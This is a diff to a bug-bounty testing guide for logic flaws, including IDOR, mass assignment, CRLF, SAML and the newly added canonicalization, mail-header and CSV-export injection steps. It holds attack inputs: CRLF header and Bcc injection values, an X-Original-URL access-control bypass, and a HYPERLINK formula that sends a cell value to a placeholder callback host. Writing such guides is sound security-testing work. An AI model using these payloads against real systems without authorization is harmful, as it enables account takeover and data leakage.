@@ -20,7 +20,7 @@ Use this when the bug is not a named injection class: broken object access, skip
 ## Decision tree
 
 1. **Who is the caller, and which object is in the response?** Map roles the product actually has (owner, member, guest, removed). Unique marker per object: 8+ random alphanumerics, not `test` or `admin`. If the marker appears in a baseline that never received it, pick another marker.
-2. **ID swap.** With A's session, request B's id (and the reverse) on each endpoint that echoes an id. **Body must differ** and must contain B's marker. Identical 200s are not IDOR. Try one old API version, one method swap, and one content-type only if the first request was checked and denied — not as a fuzz campaign.
+2. **ID swap.** With A's session, request B's id (and the reverse) on each endpoint that echoes an id. **Body must differ** and must contain B's marker. Identical 200s are not IDOR. On each of those endpoints also send one older version prefix, one alternate method, one alternate content-type (JSON vs form), and one `X-Original-URL` / `X-Rewrite-URL` header naming the denied path (front-end ACL vs back-end route mismatch), plus the id wrapped once as an array and once as `{"id":"<B>"}`. A handful of requests, not a wordlist. Do this when the first body is a denial **or** a 200 that lacks B's marker.
 3. **State skip.** Invitation, email change, password reset, checkout, "verify later". Replay a token in a second session, skip a step, reuse a token after it should be dead. Proof is the privileged body, not a 200.
 4. **Mass assignment.** Add `role`, `is_admin`, `org_id`, `owner_id`, `email_verified`, `price`, `plan` to a normal JSON update. Proof is a later GET that shows the field stuck, and an action only that field should allow.
 5. **Removal and expiry.** Remove A from the org (or expire the invite). A's old session and PAT must fail. If they still return B's data, that response is the bug.
@@ -29,6 +29,9 @@ Use this when the bug is not a named injection class: broken object access, skip
 8. **CRLF.** If a value you send is copied into a header (`Location`, `Set-Cookie`, a custom `X-`), try `%0d%0aX-Misc-UNIQ: 1`. Proof is that header on the response (`curl -D -`), not a browser quirk. Cache impact only if `hunt-cache-poison` second-client rules pass.
 9. **Subdomain / redirect allow-list.** NXDOMAIN or a dangling CNAME is a lead. Claim takeover only after you control the name and a unique HTTP or DNS marker answers. OAuth `redirect_uri` on that name is ATO only if a code for your test client lands on it (`hunt-host-header`, `hunt-oauth`).
 10. **SAML / OIDC logic** → `hunt-saml` / `hunt-oauth`. A signature you stripped that still logs you in as a user you name is the bug. Parser-differential (ruby-saml CVE-2025-25291 / CVE-2025-25292 class, samlify CVE-2025-47949 class) only on stacks that use that library — prove the NameID you injected is the session you received.
+11. **Identity canonicalization.** Register A with a unique email marker. Try that same mailbox once via case flip, one NFKC lookalike, a `+tag`, a trailing dot, or punycode. Proof is a login that lands in A's session, or a reset for A delivered to an inbox you control that is not the string A registered. One pair, not a homoglyph wordlist.
+12. **Mail-header injection.** A field you set is copied into a header of a message the app sends. One value: `you@your-inbox` preceded by CRLF `Bcc:`. Proof is that single message in your inbox. No second recipient, no mail-bomb.
+13. **Export formula injection.** A value you control (name, bio, SKU) lands in a CSV/XLSX export. Set it once to `=HYPERLINK("http://UNIQUE.collab/csv?d="&A2,"open")`, export, and open the file **yourself**. Proof is one callback carrying a cell value. No `cmd`/DDE payloads, and never send the file to anyone.
 
 Missing SPF, DKIM, DMARC, security headers, or a "spoofing risk" with no accepted mail is not a finding (`security-arsenal` always-rejected list).
 
@@ -63,6 +66,8 @@ curl -sD - "https://TARGET/redirect?next=https://TARGET.example/%0d%0aX-Misc-UNI
 | SAML signature ignored | Session is the injected NameID | SSO ATO. One user you can demonstrate |
 | Dangling name you now control | `redirect_uri` or reset link receives a code/token | ATO of your test user, described as the victim path |
 | Low-scope token writes | Control request with no scope fails | Scope bypass on that route |
+| Second string for the same mailbox | Session or reset belongs to A | Account confusion via canonicalization |
+| CRLF in a mail header | One Bcc you received | Header injection. Not a phishing campaign |
 
 Do not cite GitLab H1 #1160407 as CRLF. That report is cache poisoning via `X-HTTP-Method-Override` (`hunt-cache-poison`).
 
